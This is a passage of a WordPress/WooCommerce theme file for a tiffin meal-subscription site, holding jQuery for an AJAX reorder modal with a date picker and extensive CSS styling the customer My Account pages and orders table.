                ],
                onOpen: function(selectedDates, dateStr, instance) {
                    var localNow = new Date();
                    var localTomorrow = new Date(localNow.getFullYear(), localNow.getMonth(), localNow.getDate() + 1);
                    instance.set('minDate', localTomorrow);
                }
            });
        }
        
        // Open modal and load order details
        window.openReorderModal = function(orderId) {
            $('#satguru-reorder-modal').show();
            $('#reorder-modal-loading').show();
            $('#reorder-modal-body').hide();
            $('#reorder-error-msg').hide();
            
            $.ajax({
                url: '<?php echo admin_url("admin-ajax.php"); ?>',
                type: 'POST',
                data: {
                    action: 'satguru_get_reorder_details',
                    nonce: reorderNonce,
                    order_id: orderId
                },
                success: function(response) {
                    if (response.success) {
                        displayOrderDetails(response.data);
                    } else {
                        showReorderError(response.data.message || 'Failed to load order');
                    }
                },
                error: function() {
                    showReorderError('Network error. Please try again.');
                }
            });
        };
        
        function displayOrderDetails(data) {
            $('#reorder-order-id').val(data.order_id);
            $('#reorder-order-number').text(data.order_number);
            
            var itemsHtml = '';
            var originalPreferredDays = '';
            
            data.items.forEach(function(item) {
                itemsHtml += '<div class="reorder-item">';
                itemsHtml += '<div><span class="reorder-item-name">' + item.name + '</span>';
                if (item.number_of_tiffins) {
                    itemsHtml += '<div class="reorder-item-meta">Tiffins: ' + item.number_of_tiffins + '</div>';
                }
                itemsHtml += '</div>';
                itemsHtml += '<div>' + item.total + '</div>';
                itemsHtml += '</div>';
                
                if (item.preferred_days && !originalPreferredDays) {
                    originalPreferredDays = item.preferred_days;
                }
            });
            
            $('#reorder-items-list').html(itemsHtml);
            
            // Pre-select preferred days if found
            if (originalPreferredDays) {
                $('#reorder-preferred-days option').each(function() {
                    if ($(this).val() === originalPreferredDays) {
                        $(this).prop('selected', true);
                    }
                });
            }
            
            // Initialize Flatpickr after modal body is shown
            $('#reorder-modal-loading').hide();
            $('#reorder-modal-body').show();
            
            // Initialize Flatpickr date picker
            initReorderFlatpickr();
        }
        
        function showReorderError(message) {
            $('#reorder-modal-loading').hide();
            $('#reorder-error-msg').text(message).show();
            $('#reorder-modal-body').show();
        }
        
        // Close modal
        window.closeReorderModal = function() {
            $('#satguru-reorder-modal').hide();
            $('#reorder-form')[0].reset();
            // Clear flatpickr
            if (reorderFlatpickrInstance) {
                reorderFlatpickrInstance.clear();
            }
        };
        
        $('.satguru-modal-overlay, .satguru-modal-close').on('click', closeReorderModal);
        
        // Handle form submit
        $('#reorder-form').on('submit', function(e) {
            e.preventDefault();
            
            var startDate = $('#reorder-start-date').val();
            if (!startDate) {
                $('#reorder-error-msg').text('Please select a start date').show();
                return;
            }
            
            var $btn = $('#reorder-submit-btn');
            $btn.prop('disabled', true);
            $btn.find('.btn-text').hide();
            $btn.find('.btn-loading').show();
            $('#reorder-error-msg').hide();
            
            $.ajax({
                url: '<?php echo admin_url("admin-ajax.php"); ?>',
                type: 'POST',
                data: {
                    action: 'satguru_process_reorder',
                    nonce: reorderNonce,
                    order_id: $('#reorder-order-id').val(),
                    start_date: startDate,
                    preferred_days: $('#reorder-preferred-days').val()
                },
                success: function(response) {
                    if (response.success) {
                        window.location.href = response.data.redirect;
                    } else {
                        $('#reorder-error-msg').text(response.data.message).show();
                        $btn.prop('disabled', false);
                        $btn.find('.btn-text').show();
                        $btn.find('.btn-loading').hide();
                    }
                },
                error: function() {
                    $('#reorder-error-msg').text('Network error. Please try again.').show();
                    $btn.prop('disabled', false);
                    $btn.find('.btn-text').show();
                    $btn.find('.btn-loading').hide();
                }
            });
        });
        
        // Close on escape key
        $(document).on('keydown', function(e) {
            if (e.key === 'Escape') closeReorderModal();
        });
    });
    </script>
    <?php
}
add_action('wp_footer', 'satguru_reorder_modal_assets');

/**
 * Modern My Account Page Styling - TiffinGrab Theme
 */
function satguru_my_account_styles() {
    if (!is_account_page()) return;
    ?>
    <style>
    /* =========================================
       WOOCOMMERCE DEFAULT CSS OVERRIDES
       ========================================= */
    
    /* Override WooCommerce default styles with !important */
    .woocommerce-account .woocommerce-MyAccount-navigation,
    .woocommerce-account .woocommerce-MyAccount-content {
        float: none !important;
        width: auto !important;
        margin: 0 !important;
    }
    
    .woocommerce-account .woocommerce-MyAccount-navigation ul {
        list-style: none !important;
        margin: 0 !important;
        padding: 0 !important;
    }
    
    .woocommerce-account .woocommerce-MyAccount-navigation ul li {
        list-style: none !important;
        margin: 0 !important;
        padding: 0 !important;
        border: none !important;
    }
    
    .woocommerce-account .woocommerce-MyAccount-navigation ul li a {
        text-decoration: none !important;
        border: none !important;
        padding: 12px 16px !important;
        display: flex !important;
        align-items: center !important;
    }
    
    .woocommerce-orders-table {
        border: none !important;
        border-collapse: separate !important;
        border-spacing: 0 !important;
        margin: 0 !important;
    }
    
    .woocommerce-orders-table thead th,
    .woocommerce-orders-table tbody td {
        border: none !important;
        padding: 16px 20px !important;
    }
    
    .woocommerce-orders-table tbody tr {
        border: none !important;
        border-bottom: 1px solid #F1F5F9 !important;
    }
    
    .woocommerce-orders-table tbody tr:last-child {
        border-bottom: none !important;
    }
    
    .woocommerce-orders-table__cell-order-actions a {
        text-decoration: none !important;
        border: none !important;
        display: inline-flex !important;
        align-items: center !important;
    }
    
    .woocommerce-button,
    .woocommerce-button--next,
    .woocommerce-button--previous {
        text-decoration: none !important;
        border: none !important;
        display: inline-flex !important;
    }
    
    /* =========================================
       TIFFINGRAB MY ACCOUNT - PREMIUM DESIGN
       ========================================= */
    
    :root {
        --tg-primary: #F97316;
        --tg-primary-dark: #EA580C;
        --tg-primary-light: #FDBA74;
        --tg-primary-lighter: #FFF7ED;
        --tg-secondary: #1E293B;
        --tg-text: #334155;
        --tg-text-light: #64748B;
        --tg-text-muted: #94A3B8;
        --tg-border: #E2E8F0;
        --tg-bg: #F8FAFC;
        --tg-white: #FFFFFF;
        --tg-success: #22C55E;
        --tg-success-bg: #DCFCE7;
    }
    
    /* Reset & Base */
    .woocommerce-account .woocommerce {
        font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif !important;
    }
    
    /* Layout Container */
    @media (min-width: 768px) {
        .woocommerce-account .woocommerce,
        .woocommerce-account .entry-content,
        .woocommerce-account .elementor-widget-woocommerce-my-account .elementor-widget-container {
            display: flex !important;
            gap: 32px !important;
            max-width: 1280px !important;
            margin: 0 auto !important;
            padding: 32px 24px !important;
            align-items: flex-start !important;
            min-height: 600px !important;
        }
        
        .woocommerce-MyAccount-navigation {
            flex: 0 0 240px !important;
            width: 240px !important;
            position: sticky !important;
            top: 100px !important;
            float: none !important;
        }
        
        .woocommerce-MyAccount-content {
            flex: 1 !important;
            min-width: 0 !important;
            float: none !important;
            background: var(--tg-white) !important;
        }
    }
    
    @media (max-width: 767px) {
        .woocommerce-MyAccount-navigation,
        .woocommerce-MyAccount-content {
            width: 100% !important;
            float: none !important;
        }
    }
    
    /* =========================================
       SIDEBAR NAVIGATION - Clean Card Style
       ========================================= */
    
    .woocommerce-MyAccount-navigation {
        background: var(--tg-white);
        border-radius: 12px;
        box-shadow: 0 1px 3px rgba(0,0,0,0.08), 0 1px 2px rgba(0,0,0,0.04);
        overflow: hidden;
        margin-bottom: 24px;
    }
    
    .woocommerce-MyAccount-navigation ul {
        list-style: none !important;
        margin: 0 !important;
        padding: 8px !important;
    }
    
    .woocommerce-MyAccount-navigation ul li {
        margin: 0 !important;
        padding: 0 !important;
    }
    
    .woocommerce-MyAccount-navigation ul li a {
        display: flex;
        align-items: center;
        gap: 12px;
        padding: 12px 16px;
        margin: 2px 0;
        color: var(--tg-text);
        text-decoration: none;
        font-weight: 500;
        font-size: 14px;
        border-radius: 8px;
        transition: all 0.15s ease;
    }
    
    .woocommerce-MyAccount-navigation ul li a:hover {
        background: var(--tg-bg);
        color: var(--tg-primary);
    }
    
    .woocommerce-MyAccount-navigation ul li.is-active a {
        background: var(--tg-primary);
        color: var(--tg-white);
        font-weight: 600;
    }
    
    /* Logout separator */
    .woocommerce-MyAccount-navigation ul li.woocommerce-MyAccount-navigation-link--customer-logout {
        margin-top: 8px !important;
        padding-top: 8px !important;
        border-top: 1px solid var(--tg-border);
    }
    
    /* Navigation Icons */
    .woocommerce-MyAccount-navigation ul li a::before {
        content: '';
        width: 20px;
        height: 20px;
        flex-shrink: 0;
        background-size: 20px 20px;
        background-repeat: no-repeat;
        background-position: center;
    }
    
    .woocommerce-MyAccount-navigation ul li.woocommerce-MyAccount-navigation-link--dashboard a::before {
        background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke='%2364748B' stroke-width='2'%3E%3Cpath stroke-linecap='round' stroke-linejoin='round' d='M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6'/%3E%3C/svg%3E");
    }
    
    .woocommerce-MyAccount-navigation ul li.woocommerce-MyAccount-navigation-link--orders a::before {
        background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke='%2364748B' stroke-width='2'%3E%3Cpath stroke-linecap='round' stroke-linejoin='round' d='M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2'/%3E%3C/svg%3E");
    }
    
    .woocommerce-MyAccount-navigation ul li.woocommerce-MyAccount-navigation-link--downloads a::before {
        background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke='%2364748B' stroke-width='2'%3E%3Cpath stroke-linecap='round' stroke-linejoin='round' d='M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4'/%3E%3C/svg%3E");
    }
    
    .woocommerce-MyAccount-navigation ul li.woocommerce-MyAccount-navigation-link--edit-address a::before {
        background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke='%2364748B' stroke-width='2'%3E%3Cpath stroke-linecap='round' stroke-linejoin='round' d='M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z'/%3E%3Cpath stroke-linecap='round' stroke-linejoin='round' d='M15 11a3 3 0 11-6 0 3 3 0 016 0z'/%3E%3C/svg%3E");
    }
    
    .woocommerce-MyAccount-navigation ul li.woocommerce-MyAccount-navigation-link--edit-account a::before {
        background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke='%2364748B' stroke-width='2'%3E%3Cpath stroke-linecap='round' stroke-linejoin='round' d='M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z'/%3E%3C/svg%3E");
    }
    
    .woocommerce-MyAccount-navigation ul li.woocommerce-MyAccount-navigation-link--customer-logout a::before {
        background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke='%2364748B' stroke-width='2'%3E%3Cpath stroke-linecap='round' stroke-linejoin='round' d='M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1'/%3E%3C/svg%3E");
    }
    
    .woocommerce-MyAccount-navigation ul li.is-active a::before {
        filter: brightness(0) invert(1);
    }
    
    /* =========================================
       MAIN CONTENT AREA
       ========================================= */
    
    .woocommerce-MyAccount-content {
        background: var(--tg-white) !important;
        border-radius: 0 !important;
        box-shadow: none !important;
        border: none !important;
        padding: 28px !important;
    }
    
    /* Ensure parent container has proper background */
    .woocommerce-account .woocommerce,
    .woocommerce-account .entry-content {
        background: transparent !important;
    }
    
    /* Page Title - Added via JS */
    .myaccount-page-title {
        font-size: 24px;
        font-weight: 700;
        color: var(--tg-secondary);
        margin: 0 0 6px 0;
    }
    
    .myaccount-page-subtitle {
        font-size: 14px;
        color: var(--tg-text-light);
        margin: 0 0 24px 0;
    }
    
    .woocommerce-MyAccount-content > p:first-child {
        font-size: 15px;
        color: var(--tg-text);
        line-height: 1.6;
    }
    
    /* =========================================
       ORDERS TABLE - Modern Premium Design
       ========================================= */
    
    .woocommerce-orders-table {
        width: 100%;
        border-collapse: separate;
        border-spacing: 0;
        font-size: 14px;
        background: var(--tg-white);
        border-radius: 0;
        overflow: visible;
        margin: 0;
    }
    
    /* Table Header - Clean & Modern */
    .woocommerce-orders-table thead {
        background: transparent;
    }
    
    .woocommerce-orders-table thead th {
        padding: 12px 20px;
        text-align: left;
        font-weight: 600;
        color: var(--tg-text-muted);
        font-size: 11px;
        text-transform: uppercase;
        letter-spacing: 0.8px;
        border-bottom: 1px solid var(--tg-border);
        background: transparent;
        white-space: nowrap;
    }
    
    .woocommerce-orders-table thead th:last-child {
        text-align: right;
    }
    
    /* Table Body - Clean Rows */
    .woocommerce-orders-table tbody {
        background: var(--tg-white);
    }
    
    .woocommerce-orders-table tbody tr {
        transition: background 0.15s ease;
        background: var(--tg-white);
        border-bottom: 1px solid #F1F5F9;
    }
    
    .woocommerce-orders-table tbody tr:last-child {
        border-bottom: none;
    }
    
    .woocommerce-orders-table tbody tr:hover {
        background: #FAFBFC;
    }
    
    .woocommerce-orders-table tbody td {
        padding: 16px 20px;
        vertical-align: middle;
        color: var(--tg-text);
        font-size: 14px;
        border: none;
        line-height: 1.5;
    }
    
    /* Order Number */
    .woocommerce-orders-table__cell-order-number {
        font-weight: 600;
    }
    
    .woocommerce-orders-table__cell-order-number a {
        color: var(--tg-primary);
        text-decoration: none;
        font-weight: 600;
        font-size: 14px;
    }
    
    .woocommerce-orders-table__cell-order-number a:hover {
        text-decoration: underline;
    }
    
    /* Plan Name */
    .woocommerce-orders-table__cell-order-plan {
        font-weight: 500;
        color: var(--tg-text);
        font-size: 14px;
    }
    
    .woocommerce-orders-table__cell-order-plan .order-plan-name {
        font-weight: 500;
        color: var(--tg-text);
    }
    
    /* Start Date */
    .woocommerce-orders-table__cell-order-start-date {
        font-weight: 600;
        color: var(--tg-primary);
        font-size: 14px;
    }
    
    .woocommerce-orders-table__cell-order-start-date .order-start-date {
        font-weight: 600;
        color: var(--tg-primary);
    }
    
    /* Order Date */
    .woocommerce-orders-table__cell-order-date {
        color: var(--tg-text-light);
        font-size: 13px;
    }
    
    /* Order Total */
    .woocommerce-orders-table__cell-order-total {
        font-weight: 600;
        color: var(--tg-secondary);
        font-size: 14px;
    }
    
    .woocommerce-orders-table__cell-order-total small {
        display: block;
        font-weight: 400;
        font-size: 12px;
        color: var(--tg-text-muted);
        margin-top: 2px;
    }
    
    /* Status Badges - Modern Pill Style */
    .woocommerce-orders-table__cell-order-status {
        font-weight: 500;
        font-size: 13px;
    }
    
    .woocommerce-orders-table__cell-order-status::before {
        display: none !important;
    }
    
    /* Action Buttons - Modern Style */
    .woocommerce-orders-table__cell-order-actions {
        text-align: right;
        white-space: nowrap;
        display: flex;
        align-items: center;
        justify-content: flex-end;
        gap: 8px;
    }
    
    .woocommerce-orders-table__cell-order-actions a {
        display: inline-flex;
        align-items: center;
        justify-content: center;
        gap: 6px;
        padding: 8px 16px;
        border-radius: 6px;
        font-size: 13px;
        font-weight: 500;
        text-decoration: none;
        transition: all 0.15s ease;
        min-width: auto;
        height: 36px;
        box-sizing: border-box;
        line-height: 1;
        vertical-align: middle;
    }
    
    .woocommerce-orders-table__cell-order-actions a:first-child {
        margin-left: 0;
    }
    
    /* View Button */
    .woocommerce-orders-table__cell-order-actions a.view {
        background: transparent;
        color: var(--tg-text);
        border: 1px solid var(--tg-border);
        padding: 8px 16px;
        height: 36px;
    }
    
    .woocommerce-orders-table__cell-order-actions a.view:hover {
        background: var(--tg-bg);
        border-color: var(--tg-text-muted);
    }
    
    /* Reorder Button */
    .woocommerce-orders-table__cell-order-actions a.reorder {
        background: var(--tg-primary) !important;
        color: var(--tg-white) !important;
        border: none !important;
        padding: 8px 16px !important;
        font-weight: 600 !important;
        height: 36px !important;
    }
    
    .woocommerce-orders-table__cell-order-actions a.reorder:hover {
        background: var(--tg-primary-dark) !important;
        transform: translateY(-1px);
        box-shadow: 0 2px 8px rgba(249, 115, 22, 0.3);
    }
    
    /* Ensure button icons are aligned */
    .woocommerce-orders-table__cell-order-actions a svg {
        width: 14px;
        height: 14px;
        flex-shrink: 0;
        display: block;
    }
    
    /* =========================================
       PAGINATION - Next Button
       ========================================= */
    
    .woocommerce-pagination {
        margin-top: 24px;
        text-align: center;
    }
    
    .woocommerce-button--next,
    .woocommerce-button--previous,
    .woocommerce-pagination .next,
    .woocommerce-pagination .prev {
        display: inline-flex !important;
        align-items: center !important;
        justify-content: center !important;
        background: var(--tg-primary) !important;
        color: var(--tg-white) !important;
        padding: 12px 24px !important;
        border-radius: 8px !important;
        font-weight: 600 !important;
        font-size: 14px !important;
        text-decoration: none !important;
        border: none !important;
        transition: all 0.15s !important;
    }
    
    .woocommerce-button--next:hover,
    .woocommerce-button--previous:hover {
        background: var(--tg-primary-dark) !important;
    }
    
    /* =========================================
       DASHBOARD WELCOME
       ========================================= */
    
    .woocommerce-MyAccount-content > p:first-child strong {
        color: var(--tg-secondary);
    }
    
    .woocommerce-MyAccount-content > p:first-child a {
        color: var(--tg-primary);
        font-weight: 500;
        text-decoration: none;
    }
    
    .woocommerce-MyAccount-content > p:first-child a:hover {
        text-decoration: underline;
    }
    
    /* =========================================
       ADDRESSES
       ========================================= */
    
    .woocommerce-Addresses {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
        gap: 20px;
    }
    
    .woocommerce-Address {
        background: var(--tg-bg);
        border-radius: 10px;
        padding: 20px;
    }
    
    .woocommerce-Address-title {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 12px;
        padding-bottom: 12px;
        border-bottom: 1px solid var(--tg-border);
    }
    
    .woocommerce-Address-title h3 {
        margin: 0 !important;
        font-size: 16px;
        font-weight: 600;
        color: var(--tg-secondary);
    }
    
    .woocommerce-Address-title a {
        color: var(--tg-primary);
        font-size: 14px;
        font-weight: 500;
    }
    
    .woocommerce-Address address {
        color: var(--tg-text);
        font-style: normal;
        line-height: 1.7;
    }
    
    /* =========================================
       FORMS
       ========================================= */
    
    .woocommerce-MyAccount-content form {
        max-width: 600px;
    }
    
    .woocommerce-MyAccount-content .form-row {
        margin-bottom: 20px;
    }
    
    .woocommerce-MyAccount-content label {
        display: block;
        margin-bottom: 8px;
        font-weight: 600;
        color: var(--tg-secondary);
        font-size: 14px;
    }
    
    .woocommerce-MyAccount-content input[type="text"],
    .woocommerce-MyAccount-content input[type="email"],
    .woocommerce-MyAccount-content input[type="password"],
    .woocommerce-MyAccount-content input[type="tel"],
    .woocommerce-MyAccount-content select,
    .woocommerce-MyAccount-content textarea {
        width: 100%;
        padding: 12px 16px;
        border: 2px solid var(--tg-border);
        border-radius: 10px;
        font-size: 15px;
        transition: all 0.2s;
        color: var(--tg-text);
    }
    
    .woocommerce-MyAccount-content input:focus,
    .woocommerce-MyAccount-content select:focus,
    .woocommerce-MyAccount-content textarea:focus {
        outline: none;
        border-color: var(--tg-primary);
        box-shadow: 0 0 0 3px rgba(249, 115, 22, 0.1);
    }
    
    .woocommerce-MyAccount-content button[type="submit"],
    .woocommerce-MyAccount-content .button {
        background: var(--tg-primary) !important;
        color: #fff !important;
        padding: 14px 28px !important;
        border: none !important;
        border-radius: 10px !important;
        font-size: 15px !important;
        font-weight: 600 !important;
        cursor: pointer;
        transition: all 0.2s !important;
        box-shadow: 0 4px 14px rgba(249, 115, 22, 0.25);
    }
    
    .woocommerce-MyAccount-content button[type="submit"]:hover,
    .woocommerce-MyAccount-content .button:hover {
        background: var(--tg-primary-dark) !important;
        transform: translateY(-2px);
        box-shadow: 0 6px 20px rgba(249, 115, 22, 0.35);
    }
    
    /* =========================================
       ORDER DETAILS PAGE
       ========================================= */
    
    .woocommerce-order-details {
        margin-bottom: 30px;
    }
    
    .woocommerce-order-details__title {
        font-size: 20px;
        font-weight: 700;
        color: var(--tg-secondary);
        margin-bottom: 20px;
        padding-bottom: 12px;
        border-bottom: 2px solid var(--tg-primary);
        display: inline-block;
    }
    
    .woocommerce-table--order-details {
        width: 100%;
        border-collapse: separate;
        border-spacing: 0;
        border: 1px solid var(--tg-border);
        border-radius: 12px;
        overflow: hidden;
    }
    
    .woocommerce-table--order-details thead {
        background: var(--tg-bg);
    }
    
    .woocommerce-table--order-details th,
    .woocommerce-table--order-details td {
        padding: 16px;
        text-align: left;
        border-bottom: 1px solid var(--tg-border);
    }
    
    .woocommerce-table--order-details thead th {
        font-weight: 600;
        color: var(--tg-text-light);
        font-size: 13px;
        text-transform: uppercase;
        letter-spacing: 0.5px;
    }
    
    .woocommerce-table--order-details tfoot th {
        font-weight: 600;
        color: var(--tg-secondary);
    }
    
    .woocommerce-table--order-details tfoot tr:last-child th,
    .woocommerce-table--order-details tfoot tr:last-child td {
        font-size: 18px;
        color: var(--tg-primary);
        border-bottom: none;
    }
    
    .woocommerce-table--order-details .product-name a {
        color: var(--tg-secondary);
        font-weight: 500;
        text-decoration: none;
    }
    
    .woocommerce-table--order-details .product-name a:hover {
        color: var(--tg-primary);
    }
    
    /* Order meta (like Start Date, Preferred Days) */
    .woocommerce-table--order-details .wc-item-meta {
        margin: 10px 0 0 0;
        padding: 10px;
        background: var(--tg-bg);
        border-radius: 8px;
        font-size: 13px;
    }
    
    .woocommerce-table--order-details .wc-item-meta li {
        margin: 4px 0;
        list-style: none;
    }
    
    .woocommerce-table--order-details .wc-item-meta li strong {
        color: var(--tg-text-light);
        font-weight: 500;
    }
    
    .woocommerce-table--order-details .wc-item-meta li p {
        display: inline;
        color: var(--tg-secondary);
        font-weight: 500;
    }
    
    /* =========================================
       ORDER INFO SECTIONS
       ========================================= */
    
    .woocommerce-customer-details,
    .woocommerce-order-details {
        margin-bottom: 30px;
    }
    
    .woocommerce-column__title {
        font-size: 16px;
        font-weight: 600;
        color: var(--tg-secondary);
        margin-bottom: 12px;
        padding-bottom: 8px;
        border-bottom: 1px solid var(--tg-border);
    }
    
    /* =========================================
       EMPTY STATES
       ========================================= */
    
    .woocommerce-message--info,
    .woocommerce-info {
        background: var(--tg-primary-lighter);
        border: 1px solid var(--tg-primary-light);
        color: var(--tg-primary-dark);
        padding: 16px 20px;
        border-radius: 10px;
        margin-bottom: 20px;
    }
    
    .woocommerce-message,
    .woocommerce-error {
        padding: 16px 20px;
        border-radius: 10px;
        margin-bottom: 20px;
    }
    
    .woocommerce-error {
        background: #FEF2F2;
        border: 1px solid #FECACA;
        color: #DC2626;
    }
    
    /* =========================================
       RESPONSIVE
       ========================================= */
    
    @media (max-width: 767px) {
        .woocommerce-account .woocommerce {
            padding: 20px 15px !important;
        }
        
        .woocommerce-MyAccount-content {
            padding: 20px !important;
            background: var(--tg-white) !important;
        }
        
        /* Convert table to card layout */
        .woocommerce-orders-table,
        .woocommerce-orders-table thead,
        .woocommerce-orders-table tbody,
        .woocommerce-orders-table th,
        .woocommerce-orders-table td,
        .woocommerce-orders-table tr {
            display: block !important;
        }
        
        .woocommerce-orders-table thead {
            display: none !important;
        }
        
        .woocommerce-orders-table tbody tr {
            margin-bottom: 20px !important;
            border: 1px solid var(--tg-border) !important;
            border-radius: 12px !important;
            padding: 20px !important;
            background: var(--tg-white) !important;
            box-shadow: 0 1px 3px rgba(0,0,0,0.08), 0 1px 2px rgba(0,0,0,0.04) !important;
        }
        
        .woocommerce-orders-table tbody td {
            padding: 12px 0 !important;
            border: none !important;
            display: block !important;
            text-align: left !important;
        }
        
        .woocommerce-orders-table tbody td::before {
            content: attr(data-title) ':';
            font-weight: 600;
            color: var(--tg-text);
            font-size: 13px;
            display: block;
            margin-bottom: 4px;
        }
        
        /* Order Number - Special styling at top */
        .woocommerce-orders-table__cell-order-number {
            padding-top: 0 !important;
            padding-bottom: 16px !important;
            border-bottom: 1px solid var(--tg-border) !important;
            margin-bottom: 12px !important;
        }
        
        .woocommerce-orders-table__cell-order-number::before {
            content: 'ORDER:' !important;
            font-size: 12px !important;
            color: var(--tg-text-light) !important;
            text-transform: uppercase !important;
            letter-spacing: 0.5px !important;
            font-weight: 600 !important;
        }
        
        .woocommerce-orders-table__cell-order-number a {
            display: block !important;
            margin-top: 6px !important;
            font-size: 16px !important;
            font-weight: 600 !important;
            color: var(--tg-primary) !important;
        }
        
        /* Plan Name */
        .woocommerce-orders-table__cell-order-plan::before {
            content: 'PLAN:' !important;
            font-weight: 600 !important;
            color: var(--tg-text) !important;
        }
        
        .woocommerce-orders-table__cell-order-plan {
            padding-bottom: 12px !important;
        }
        
        .woocommerce-orders-table__cell-order-plan .order-plan-name {
            font-size: 15px !important;
            font-weight: 500 !important;
            color: var(--tg-text) !important;
            margin-top: 6px !important;
            display: block !important;
        }
        
        /* Start Date */
        .woocommerce-orders-table__cell-order-start-date::before {
            content: 'START DATE:' !important;
            font-weight: 600 !important;
            color: var(--tg-text) !important;
        }
        
        .woocommerce-orders-table__cell-order-start-date {
            padding-bottom: 12px !important;
        }
        
        .woocommerce-orders-table__cell-order-start-date .order-start-date {
            font-size: 15px !important;
            font-weight: 600 !important;
            color: var(--tg-primary) !important;
            margin-top: 6px !important;
            display: block !important;
        }
        
        /* Order Date */
        .woocommerce-orders-table__cell-order-date::before {
            content: 'DATE:' !important;
            font-weight: 600 !important;
            color: var(--tg-text) !important;
        }
        
        .woocommerce-orders-table__cell-order-date {
            font-size: 14px !important;
            color: var(--tg-text-light) !important;
            padding-bottom: 12px !important;
        }
        
        /* Status */
        .woocommerce-orders-table__cell-order-status::before {
            content: 'STATUS:' !important;
            font-weight: 600 !important;
            color: var(--tg-text) !important;
        }
        
        .woocommerce-orders-table__cell-order-status {
            margin-top: 0 !important;
            padding-bottom: 12px !important;
        }
        
        .woocommerce-orders-table__cell-order-status .status-badge {
            margin-top: 6px !important;
            display: inline-block !important;
        }
        
        /* Total */
        .woocommerce-orders-table__cell-order-total::before {
            content: 'TOTAL:' !important;
            font-weight: 600 !important;
            color: var(--tg-text) !important;
        }
        
        .woocommerce-orders-table__cell-order-total {
            font-size: 15px !important;
            font-weight: 600 !important;
            color: var(--tg-text) !important;
            padding-bottom: 0 !important;
        }
        
        .woocommerce-orders-table__cell-order-total small {
            display: block !important;
            margin-top: 4px !important;
            font-size: 13px !important;
            font-weight: 400 !important;
            color: var(--tg-text-light) !important;
        }
        
        /* Actions - Buttons at bottom - Full Width Stacked */
        .woocommerce-orders-table__cell-order-actions {
            display: flex !important;
            flex-direction: column !important;
            gap: 12px !important;
            padding-top: 16px !important;
            margin-top: 16px !important;
            border-top: 1px solid var(--tg-border) !important;
            width: 100% !important;
        }
        
        .woocommerce-orders-table__cell-order-actions::before {
            display: none !important;
        }
        
        .woocommerce-orders-table__cell-order-actions a {
            width: 100% !important;
            flex: none !important;
            margin: 0 !important;
            padding: 14px 20px !important;
            text-align: center !important;
            font-size: 14px !important;
            font-weight: 600 !important;
            border-radius: 8px !important;
            display: flex !important;
            align-items: center !important;
            justify-content: center !important;
            gap: 6px !important;
            height: 44px !important;
            box-sizing: border-box !important;
            line-height: 1 !important;
        }
        
        .woocommerce-orders-table__cell-order-actions a.view {
            background: var(--tg-primary) !important;
            color: var(--tg-white) !important;
            border: none !important;
        }
        
        .woocommerce-orders-table__cell-order-actions a.view:hover {
            background: var(--tg-primary-dark) !important;
        }
        
        .woocommerce-orders-table__cell-order-actions a.reorder {
            background: var(--tg-primary) !important;
            color: var(--tg-white) !important;
            border: none !important;
        }
        
        .woocommerce-orders-table__cell-order-actions a.reorder:hover {
            background: var(--tg-primary-dark) !important;
        }
        
        /* Ensure View button icon shows on mobile */
        .woocommerce-orders-table__cell-order-actions a.view svg {
            width: 14px !important;
            height: 14px !important;
            flex-shrink: 0 !important;
            display: block !important;
        }
        
        .woocommerce-orders-table__cell-order-actions a span {
            display: inline-block !important;
        }
        
        /* Hide page title on mobile if needed */
        .myaccount-page-title {
            font-size: 20px !important;
            margin-bottom: 4px !important;
        }
        
        .myaccount-page-subtitle {
            font-size: 13px !important;
            margin-bottom: 20px !important;
        }
        
        /* Show Previous Orders button on mobile */
        .show-more-orders-wrapper {
            margin-top: 20px !important;
            padding-top: 20px !important;
        }
        
        .show-previous-orders-btn {
            width: 100% !important;
            justify-content: center !important;
            padding: 14px 20px !important;
        }
        
        /* Navigation sidebar on mobile */
        .woocommerce-MyAccount-navigation {
            margin-bottom: 20px !important;
        }
        
        /* Empty states on mobile */
        .woocommerce-orders-table .no-plan,
        .woocommerce-orders-table .no-date {
            color: var(--tg-text-muted) !important;
            font-size: 14px !important;
            margin-top: 6px !important;
            display: block !important;
        }
    }
    
    /* =========================================
       STATUS BADGES - Modern Pill Style
       ========================================= */
    
    .status-badge {
        display: inline-flex;
        align-items: center;
        gap: 6px;
        padding: 5px 12px;
        border-radius: 12px;
        font-size: 12px;
        font-weight: 600;
        line-height: 1.2;
    }
    
    .status-badge .status-dot {
        width: 6px;
        height: 6px;
        border-radius: 50%;
        flex-shrink: 0;
    }
    
    /* Show Previous Orders Button */
    .show-more-orders-wrapper {
        text-align: center;
        margin-top: 20px;
        padding-top: 20px;
    }
    
    .show-previous-orders-btn {
        display: inline-flex;
        align-items: center;
        gap: 8px;
        background: var(--tg-white);
        border: 1px solid var(--tg-border);
        color: var(--tg-text);
        padding: 10px 20px;
        border-radius: 8px;
        font-size: 14px;
        font-weight: 500;
        cursor: pointer;
